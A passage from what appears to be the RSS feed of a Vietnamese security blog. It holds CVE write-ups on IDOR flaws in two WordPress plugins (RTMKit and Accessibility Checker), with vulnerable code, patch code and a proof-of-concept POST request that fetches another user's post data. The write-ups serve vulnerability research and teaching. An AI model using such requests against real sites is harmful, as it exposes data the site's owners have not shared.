wp_send_json_error(&amp;#39;Access Denied: Insufficient permissions&amp;#39;);&#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đảm bảo chỉ những user có quyền &lt;strong&gt;Administrator&lt;/strong&gt; mới được phép tiếp tục xử lý. Nếu người dùng không đủ quyền, request sẽ bị từ chối ngay và trả về thông báo lỗi &lt;code&gt;Access Denied: Insufficient permissions&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated Contributor&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to admin-ajax.php&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;action=get_template_content&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;get_template_content() executed&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;check_ajax_referer passed&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Control template ID parameter&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;get_post_meta(target_id, _elementor_data)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Return template content&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo post bằng &lt;strong&gt;Elementor&lt;/strong&gt; với &lt;strong&gt;Contributor+ user&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Bắt request bằng BurpSuite và lấy giá trị nonce được trả về:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;script id=&amp;#34;rkit-library-script-js-extra&amp;#34;&amp;gt;&#xA;    var rkit_libs = {&amp;#34;logo_url&amp;#34;:&amp;#34;http://localhost/wp-content/plugins/rometheme-for-elementor//view/images/RTMKitNew.png&amp;#34;,&amp;#34;ajax_url&amp;#34;:&amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34;,&amp;#34;template_nonce&amp;#34;:&amp;#34;nonce_value&amp;#34;};&#xA;    //# sourceURL=rkit-library-script-js-extra&#xA;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Gửi request với &lt;code&gt;template=id_of_other_post&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: contributor_cookie&#xA;&#xA;action=get_template_content&amp;amp;wpnonce=bea52715a7&amp;amp;template=25&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/admin_post.png&#34; title=&#34;Administrator post content&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/admin_post.png&#34; data-sub-html=&#34;&lt;h2&gt;Administrator post&lt;/h2&gt;&lt;p&gt;Administrator post content&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/admin_post.png&#39; alt=&#34;Administrator post&#34; height=&#34;799&#34; width=&#34;1412&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Administrator post content&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Một số Ajax khác cũng tồn tại lỗ hổng này&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_fetch_lib&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_fetch_envato_template&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_get_installed_template&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_get_installed_templates&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_template_category&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-64283 xuất phát từ việc plugin chỉ dựa vào &lt;strong&gt;nonce&lt;/strong&gt; để xác thực request AJAX mà không thực hiện &lt;strong&gt;kiểm tra quyền truy cập theo vai trò người dùng&lt;/strong&gt;. Điều này cho phép người dùng có quyền thấp hơn (Contributor+) kiểm soát tham số &lt;code&gt;template&lt;/code&gt; và truy xuất dữ liệu &lt;code&gt;_elementor_data&lt;/code&gt; của các post không thuộc quyền sở hữu của họ. Bản vá v1.6.8 đã khắc phục vấn đề bằng cách bổ sung kiểm tra quyền quản trị, ngăn chặn việc truy cập trái phép.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonce &lt;strong&gt;không thay thế&lt;/strong&gt; cho kiểm soát quyền truy cập (authorization).&lt;/li&gt;&#xA;&lt;li&gt;AJAX action trong WordPress cần &lt;strong&gt;kiểm tra capability phù hợp&lt;/strong&gt;, không chỉ kiểm tra đăng nhập.&lt;/li&gt;&#xA;&lt;li&gt;Các tham số định danh đối tượng (ID) do người dùng kiểm soát cần được &lt;strong&gt;ràng buộc quyền truy cập rõ ràng&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;IDOR thường xuất hiện trong các logic AJAX bị cấu hình kiểm soát truy cập không đầy đủ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/rometheme-for-elementor/vulnerability/wordpress-rtmkit-plugin-1-6-7-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ARTMKit Plugin &amp;lt;= 1.6.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-57886 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-22-cve-2025-57886/</link>
      <pubDate>Mon, 22 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-22-cve-2025-57886/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;bỏ qua cơ chế phân quyền (Authorization Bypass) thông qua khóa do người dùng kiểm soát&lt;/strong&gt; trong plugin &lt;strong&gt;Equalize Digital Accessibility Checker&lt;/strong&gt; của &lt;strong&gt;Equalize Digital&lt;/strong&gt; cho phép khai thác việc &lt;strong&gt;cấu hình sai các mức kiểm soát truy cập&lt;/strong&gt;. Lỗ hổng này ảnh hưởng đến &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt; từ phiên bản &lt;strong&gt;không xác định&lt;/strong&gt; đến &lt;strong&gt;1.30.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-57886&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-57886&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.30.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.30.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/accessibility-checker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Checker by Equalize Digital Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.30.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.30.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function init_rest_routes() {&#xA;    $ns      = &amp;#39;accessibility-checker/&amp;#39;;&#xA;    $version = &amp;#39;v1&amp;#39;;&#xA;&#xA;    add_action(&#xA;        &amp;#39;rest_api_init&amp;#39;,&#xA;        function () use ( $ns, $version ) {&#xA;            register_rest_route(&#xA;                $ns . $version,&#xA;                &amp;#39;/post-scan-results/(?P&amp;lt;id&amp;gt;\d&amp;#43;)&amp;#39;,&#xA;                [&#xA;                    &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;                    &amp;#39;callback&amp;#39;            =&amp;gt; [ $this, &amp;#39;set_post_scan_results&amp;#39; ],&#xA;                    &amp;#39;args&amp;#39;                =&amp;gt; [&#xA;                        &amp;#39;id&amp;#39; =&amp;gt; [&#xA;                            &amp;#39;validate_callback&amp;#39; =&amp;gt; function ( $param ) {&#xA;                                return is_numeric( $param );&#xA;                            },&#xA;                        ],&#xA;                    ],&#xA;                    &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                        return current_user_can( &amp;#39;edit_posts&amp;#39; );&#xA;                    },&#xA;                ]&#xA;            );&#xA;        }&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nhìn vào logic của đoạn code, chúng ta có thể rút ra một số điểm quan trọng:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Namespace và route&lt;/strong&gt;&#xA;Endpoint được đặt dưới &lt;code&gt;accessibility-checker/v1&lt;/code&gt; với route &lt;code&gt;/post-scan-results/{id}&lt;/code&gt;. Tham số &lt;code&gt;id&lt;/code&gt; được định nghĩa là &lt;strong&gt;số&lt;/strong&gt;, nhờ regex &lt;code&gt;\d+&lt;/code&gt; và &lt;code&gt;validate_callback&lt;/code&gt;. Đây là một bước kiểm tra cơ bản, nhưng chưa hề kiểm tra xem &lt;code&gt;id&lt;/code&gt; có tồn tại hay thuộc post type nào.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Phương thức HTTP&lt;/strong&gt;&#xA;Route chỉ chấp nhận &lt;code&gt;POST&lt;/code&gt;, gợi ý rằng đây là endpoint &lt;strong&gt;ghi hoặc cập nhật dữ liệu&lt;/strong&gt;, không phải chỉ đọc.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kiểm tra quyền&lt;/strong&gt;&#xA;&lt;code&gt;permission_callback&lt;/code&gt; chỉ kiểm tra capability tổng quát &lt;code&gt;edit_posts&lt;/code&gt; (Contributor+). Quyết định cho phép hay từ chối request &lt;strong&gt;không dựa vào post cụ thể&lt;/strong&gt;, tức là &lt;strong&gt;user có quyền tổng quát sẽ được phép thao tác với bất kỳ &lt;code&gt;id&lt;/code&gt; nào&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Callback xử lý&lt;/strong&gt;&#xA;Nếu vượt qua permission, WordPress gọi &lt;code&gt;set_post_scan_results&lt;/code&gt; với &lt;code&gt;$id&lt;/code&gt; do client cung cấp. Tại đây, toàn bộ logic xử lý dữ liệu hoàn toàn &lt;strong&gt;tin vào giá trị &lt;code&gt;id&lt;/code&gt; mà client kiểm soát&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function set_post_scan_results( $request ) {&#xA;    if ( ! isset( $request[&amp;#39;violations&amp;#39;] ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;A required parameter is missing.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;    $post    = get_post( $post_id );&#xA;    if ( ! is_object( $post ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;The post is not valid.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $post_type  = get_post_type( $post );&#xA;    $post_types = Helpers::get_option_as_array( &amp;#39;edac_post_types&amp;#39; );&#xA;    if ( empty( $post_types ) || ! in_array( $post_type, $post_types, true ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;The post type is not set to be scanned.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $rules = edac_register_rules();&#xA;    $js_rule_ids = [];&#xA;    $combined_rule_ids = [];&#xA;    ...&#xA;&#xA;    try {&#xA;        do_action( &amp;#39;edac_before_validate&amp;#39;, $post_id, &amp;#39;js&amp;#39; );&#xA;&#xA;        $violations = $request[&amp;#39;violations&amp;#39;];&#xA;        edac_remove_corrected_posts( $post_id, $post-&amp;gt;post_type, 1, &amp;#39;js&amp;#39; );&#xA;&#xA;        if ( is_array( $violations ) &amp;amp;&amp;amp; count( $violations ) &amp;gt; 0 ) {&#xA;            foreach ( $violations as $violation ) {&#xA;                $rule_id = $violation[&amp;#39;ruleId&amp;#39;];&#xA;                $actual_rule_id = $combined_rule_ids[ $rule_id ] ?? $rule_id;&#xA;                if ( in_array( $actual_rule_id, $js_rule_ids, true ) ) {&#xA;                    ...&#xA;                    ( new Insert_Rule_Data() )-&amp;gt;insert( $post, $actual_rule_id, $impact, $html, $landmark, $landmark_selector, $selectors );&#xA;                    ...&#xA;                }&#xA;            }&#xA;        }&#xA;&#xA;        do_action( &amp;#39;edac_after_validate&amp;#39;, $post_id, &amp;#39;js&amp;#39; );&#xA;        edac_remove_corrected_posts( $post_id, $post-&amp;gt;post_type, 2, &amp;#39;js&amp;#39; );&#xA;&#xA;        $metrics = $request[&amp;#39;densityMetrics&amp;#39;] ?? [ 0, 0 ];&#xA;        update_post_meta( $post_id, &amp;#39;_edac_density_data&amp;#39;, [ $metrics[&amp;#39;elementCount&amp;#39;] ?? 0, $metrics[&amp;#39;contentLength&amp;#39;] ?? 0 ] );&#xA;&#xA;        ( new Summary_Generator( $post_id ) )-&amp;gt;generate_summary();&#xA;        update_post_meta( $post_id, &amp;#39;_edac_post_checked_js&amp;#39;, time() );&#xA;&#xA;        do_action( &amp;#39;edac_validate_before_sending_rest_response&amp;#39;, $post_id, &amp;#39;js&amp;#39;, $request );&#xA;&#xA;        return new \WP_REST_Response( [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;id&amp;#39; =&amp;gt; $post_id, &amp;#39;timestamp&amp;#39; =&amp;gt; time() ] );&#xA;&#xA;    } catch ( \Exception $ex ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; $ex-&amp;gt;getMessage() ], 500 );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm nhận request từ REST API và xử lý kết quả quét accessibility cho một bài viết. Luồng logic chính gồm:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kiểm tra đầu vào&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! isset( $request[&amp;#39;violations&amp;#39;] ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Missing violations&amp;#39; ], 400);&#xA;}&#xA;$post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;$post = get_post( $post_id );&#xA;if ( ! is_object( $post ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Invalid post&amp;#39; ], 400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kiểm tra post 